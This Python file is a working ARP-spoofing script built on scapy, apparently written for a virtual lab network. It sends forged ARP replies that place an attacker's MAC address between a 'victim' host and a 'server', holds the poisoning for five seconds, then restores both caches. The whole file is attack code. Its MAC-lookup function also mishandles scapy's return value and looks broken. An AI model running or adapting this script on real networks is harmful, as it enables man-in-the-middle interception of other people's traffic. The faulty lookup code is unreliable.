import scapy.all as scapy
import time


def get_mac_addr(ip):
    
    arp_req_pkt = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=ip)
    answered = scapy.srp(arp_req_pkt, timeout=1, verbose=False)

    if answered:
        return answered[0][1].hwsrc

    print("failed to get MAC address for IP:", ip)
    return None


if __name__ == "__main__":

    victim_ip = "192.168.56.101"
    server_ip = "192.168.56.102"

    victim_mac = get_mac_addr(victim_ip)
    server_mac = get_mac_addr(server_ip)
    attacker_mac = "08:00:27:D0:25:4B"


    print(f" Victim {victim_ip} is at {victim_mac}")
    print(f" Server {server_ip} is at {server_mac}")

    # sending spoofed ARP packet to the victim
    arp_victim = scapy.ARP(op=2, psrc=server_ip, hwsrc=attacker_mac ,pdst=victim_ip, hwdst=victim_mac)
    scapy.send(arp_victim, verbose=False)

    # sending spoofed ARP packet to the server
    arp_server = scapy.ARP(op=2, psrc=victim_ip, hwsrc=attacker_mac, pdst=server_ip, hwdst=server_mac)
    scapy.send(arp_server, verbose=False)

    time.sleep(5)

    # restoring the victim's ARP cache
    arp_victim = scapy.ARP(op=2, psrc=server_ip, hwsrc=server_mac, pdst=victim_ip, hwdst=victim_mac)
    scapy.send(arp_victim, verbose=False)

    # restoring the server's ARP cache
    arp_server = scapy.ARP(op=2, psrc=victim_ip, hwsrc=victim_mac, pdst=server_ip, hwdst=server_mac)
    scapy.send(arp_server, verbose=False)

    




